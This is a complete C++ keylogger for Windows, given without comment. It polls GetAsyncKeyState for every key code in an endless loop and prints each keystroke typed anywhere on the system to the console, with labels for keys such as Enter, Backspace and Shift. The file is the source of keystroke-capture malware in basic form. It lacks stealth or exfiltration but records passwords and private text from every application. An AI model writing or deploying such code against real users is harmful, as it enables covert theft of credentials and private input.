#include <iostream>
#include <unordered_map>
#include <Windows.h>

const DWORD DELAY_MS = 10; // 10ms delay

void logKeys(std::unordered_map<int, bool>& prevKeyState) {
    DWORD startTime = GetTickCount(); 
    DWORD elapsedTime = 0;

    while (elapsedTime < DELAY_MS) {
        for (int key = 8; key <= 255; ++key) {
            SHORT keyState = GetAsyncKeyState(key);
            if (keyState & 0x8000) {
                if (!prevKeyState[key]) {
                    switch (key) {
                        case VK_SPACE:
                            std::cout << " ";
                            break;
                        case VK_BACK:
                            std::cout << "[BACKSPACE]";
                            break;
                        case VK_TAB:
                            std::cout << "[TAB]";
                            break;
                        case VK_RETURN:
                            std::cout << "[ENTER]";
                            break;
                        case VK_SHIFT:
                            std::cout << "[SHIFT]";
                            break;
                        case VK_CONTROL:
                            std::cout << "[CTRL]";
                            break;
                        case VK_MENU:
                            std::cout << "[ALT]";
                            break;
                        case VK_CAPITAL:
                            std::cout << "[CAPS LOCK]";
                            break;
                        case VK_ESCAPE:
                            std::cout << "[ESC]";
                            break;
                        case VK_LEFT:
                            std::cout << "[LEFT ARROW]";
                            break;
                        case VK_UP:
                            std::cout << "[UP ARROW]";
                            break;
                        case VK_RIGHT:
                            std::cout << "[RIGHT ARROW]";
                            break;
                        case VK_DOWN:
                            std::cout << "[DOWN ARROW]";
                            break;
                        default:
                            std::cout << static_cast<char>(key);
                            break;
                    }
                    std::cout.flush(); // Flush the output buffer
                    prevKeyState[key] = true;
                }
            } else {
                prevKeyState[key] = false;
            }
        }
        elapsedTime = GetTickCount() - startTime;
    }
}

int main() {
    std::unordered_map<int, bool> prevKeyState;
    for (int key = 8; key <= 255; ++key) {
        prevKeyState[key] = false;
    }

    while (true) {
        logKeys(prevKeyState);
    }
    return 0;
}
